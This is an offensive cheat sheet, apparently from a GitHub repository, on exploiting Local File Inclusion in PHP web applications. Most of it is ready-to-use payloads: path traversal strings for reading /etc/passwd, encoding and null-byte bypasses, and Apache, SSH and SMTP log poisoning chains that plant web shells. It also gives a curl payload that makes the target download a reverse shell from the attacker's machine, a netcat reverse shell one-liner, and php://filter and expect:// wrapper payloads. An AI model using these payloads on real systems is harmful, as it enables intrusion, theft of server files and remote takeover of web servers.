# Local File Inclusion/lfi
## @Author : M3tr1c_r00t

![image](https://user-images.githubusercontent.com/99975622/211413582-dd96e035-6a45-477a-8d87-9868762c999b.png)


<li>
  <ul>An lfi is a web vulnerability which allows one to be able to view the servers files or even include other files within the root folder of the web server.
  </ul>
  <ul>An lfi can lead to information disclosure, cross-site scripting(XSS) and even rce(remote code execution).
  </ul>
  <ul>
  An lfi can occur when a server has been poorly configured or no proper sanitization practices are being observed.
  </ul>
  <ul>
  Lfi's usually occur when an application uses a path to a file as input.
  </ul>
  <ul>
  The server treats the input as trusted and is then executed.
  </ul>
  <ul>
  Other lfi's gives attackers the abilities to upload files into the server.
  </ul>
</li>

For example;
```
https://example-site.com/?module=contact.php
```
As an attacker, we can change the module part, as it being used as a path to the contact.php and try to view the internal files...

```
https://example-site.com/?module=/etc/passwd
```
### LFI Attacks

#### We can test for lfi vulnerable code by using "../" a couple of times
```
https://example-site.com/?module=../../../../etc/passwd
```
The code example for this can be
```
<?php
$file = $_GET['file'];

 include('directory/' . $file)

?>  

#or

<?php
   $file = $_GET['file'];
   if(isset($file))
   {
       include("$file");
   }
   else
   {
       include("index.php");
   }
   ?>
```
##### This vuln can be fixed with the below code tho its still vulnerable...

```
<?php

if(isset($_GET['file']))
{
        $file=str_replace('../','',$_GET['file']);
        $file=str_replace('./','',$file);
        echo @file_get_contents('./'.$file);
}

?>
    
```

#### bypass of: $_GET['param']."php"
In some servers, they add a definite file extension to prevent exploitation....
<br>
We can exploit this by adding a null byte in url encoding:
<br>
This only applies to php version 5.3.4 and below...
```
http://example.com/index.php?page=../../../etc/passwd%00 // Only applies to PHP 5.3.4 and below
```
<br>

#### In other cases, we can use url encoding...
```
http://example.com/index.php?page=..%252f..%252f..%252fetc%252fpasswd
http://example.com/index.php?page=..%c0%af..%c0%af..%c0%afetc%c0%afpasswd
```
#### If that doesn't work, try double url encoding...
```
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd
http://example.com/index.php?page=%252e%252e%252fetc%252fpasswd%00
```

#### Accessing a local server...
```
http://example.com/index.php?page=http://IP:PORT/file.php
http://example.com/index.php?page=http://IP:PORT/file // dont put extension if there's  the php extension added in the code...


### Exploiting the LFI...
After you've already gotten your lfi, some keep files you can look out for include:

```
/var/log/apache2/access.log // if the server is apache
/var/log/auth.log //for ssh log poisoning
/var/log/mail.log //for smtp log poisonig

```
#### for Apache log poisoning...
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log 

 

Payload: curl "http://192.168.8.108/" -H "User-Agent: <?php system(\$_GET['c']); ?>" 



Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/apache2/access.log&c=id

OR

python -m SimpleHTTPServer 9000 



Payload: curl "http://<remote_ip>/" -H "User-Agent: <?php file_put_contents('shell.php',file_get_contents('http://<local_ip>:9000/shell-php-rev.php')) ?>" 


file_put_contents('shell.php')                                // What it will be saved locally on the target
file_get_contents('http://<local_ip>:9000/shell-php-rev.php') // Where is the shell on YOUR pc and WHAT is it called

Execute PHP Reverse Shell: http//10.10.10.10/shell.php
```

#### SSh log poisoning
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log 



Payload: ssh <?php system($_GET['c']);?>@<target_ip>


Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/auth.log&c=id
```
#### SMTP log poisoning
```
Example URL: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log 



telnet <target_ip> 25 // Replace with the target IP
MAIL FROM:<toor@gmail.com>
RCPT TO:<?php system($_GET['c']); ?>

Execute RCE: http//10.10.10.10/index.php?file=../../../../../../../var/log/mail.log&c=id
```


#### Extras
Here are some php rce code that you can use in a suited situation....
```
<?php system($_GET['c']); ?>
<?php system($_REQUEST['c']$); ?>

<?php
$os = shell_exec('id');
echo "<pre>$os</pre>";
?>

<?php
$os = shell_exec('nc 10.10.10.10 4444 -e /bin/bash');
?>

// Replace IP & Port

Dangerous PHP Functions that can be abused for RCE
<?php
print_r(preg_grep("/^(system|exec|shell_exec|passthru|proc_open|popen|curl_exec|curl_multi_exec|parse_ini_file|show_source)$/", get_defined_functions(TRUE)["internal"]));
?>
```

##### PHP wrappers
PHP wrappers are additional codes which tell the stream how to handle specific protocols/encodings...
A wrapper is an entity that surrounds another entity (in this case – code). The wrapper can contain functionality added to the original code. PHP uses built-in wrappers, which are implemented alongside file system functions. Attackers use this native functionality of PHP to add vulnerabilities into wrappers.
```
PHP Expect Wrapper
PHP expect:// allows execution of system commands, unfortunately the expect PHP module is not enabled by default.

php?page=expect://ls

php://filter allows a pen tester to include local files and base64 encodes the output. Therefore, any base64 output will need to be decoded to reveal the contents.

php://filter can also be used without base64 encoding the output using:

http://example.com/index.php?page=php://filter/read=string.rot13/resource=index.php
http://example.com/index.php?page=php://filter/convert.iconv.utf-8.utf-16/resource=index.php
http://example.com/index.php?page=php://filter/convert.base64-encode/resource=index.php
http://example.com/index.php?page=pHp://FilTer/convert.base64-encode/resource=index.php
```


#### sources
```
https://book.hacktricks.xyz/pentesting-web/file-inclusion
https://highon.coffee/blog/lfi-cheat-sheet/
https://brightsec.com/blog/local-file-inclusion-lfi/
```


## My socials:
<br>@ twitter: https://twitter.com/M3tr1c_root
<br>@ instagram: https://instagram.com/m3tr1c_r00t/
